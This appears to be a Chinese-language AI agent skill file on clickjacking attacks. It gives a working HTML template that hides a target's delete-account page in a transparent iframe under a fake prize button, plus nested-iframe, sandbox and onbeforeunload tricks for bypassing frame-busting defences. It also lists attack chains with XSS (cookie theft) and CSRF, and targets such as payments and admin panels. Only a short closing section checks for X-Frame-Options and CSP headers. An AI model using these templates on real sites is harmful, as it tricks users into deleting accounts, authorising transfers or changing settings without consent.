---
name: 点击劫持攻击
description: Use when encountering 点击劫持漏洞检测和利用技术
---

# 点击劫持攻击

## Info

- **Domain**: web
- **Tags**: web, clickjacking, ui-redress

## 攻击思路
```
透明iframe覆盖 → 诱导点击敏感按钮 → 触发受害者操作
```

## 核心技术

| 技术 | 说明 |
|------|------|
| 透明iframe | opacity:0 或 visibility:hidden |
| 绝对定位 | position:absolute 覆盖按钮 |
| 多层嵌套 | 绕过frame busting脚本 |
| CSS pointer-events | 控制点击穿透 |

## 基础攻击模板

```html
<style>
  iframe {
    position:absolute; top:0; left:0; width:100%; height:100%;
    opacity:0; z-index:2;
  }
  .诱饵按钮 {
    position:relative; z-index:1;
  }
</style>
<iframe src="http://target.com/delete-account"></iframe>
<button class="诱饵按钮">领取奖品</button>
```

## 组合攻击链

### 点击劫持 + XSS
```
iframe嵌入存在XSS的页面 → 点击触发XSS → 窃取Cookie/Session
```

### 点击劫持 + CSRF
```
透明iframe承载CSRF表单 → 诱导点击提交 → 完成敏感操作
```

### 多层iframe绕过
```html
<iframe src="layer1.html" style="opacity:0">
  <iframe src="layer2.html" style="opacity:0">
    <iframe src="target.html"></iframe>
  </iframe>
</iframe>
```

## Frame Busting绕过技术

| 防御代码 | 绕过方法 |
|----------|----------|
| `if(top!=self)` | onbeforeunload阻止跳转 |
| `top.location=self.location` | sandbox属性禁止脚本 |
| `document.write` | 双重框架嵌套 |
| XSS过滤器 | 利用HTML实体编码 |

### sandbox属性绕过
```html
<iframe src="target.html" sandbox="allow-forms allow-scripts">
<!-- 禁止top.location修改 -->
```

### onbeforeunload阻止
```javascript
// 阻止frame busting跳转
window.onbeforeunload = function() { return "确定离开?"; };
```

## 高级利用场景

| 场景 | 目标操作 |
|------|----------|
| 社交媒体 | 自动关注/转发/点赞 |
| 金融支付 | 授权转账/确认订单 |
| 管理后台 | 删除用户/修改配置 |
| 云服务 | 授权访问/共享文件 |

## 检测方法

```bash
# 创建测试页面
curl -s "http://target.com/sensitive-action" > test.html

# 检查X-Frame-Options
curl -I "http://target.com" | grep -i "x-frame-options"

# 检查CSP frame-ancestors
curl -I "http://target.com" | grep -i "content-security-policy"
```

## 漏洞判定

| 情况 | 可利用性 |
|------|----------|
| 无X-Frame-Options/CSP | 高风险 |
| X-Frame-Options:SAMEORIGIN | 需同域iframe |
| CSP frame-ancestors限制 | 需绕过或同域 |
| 有frame busting | 可尝试绕过 |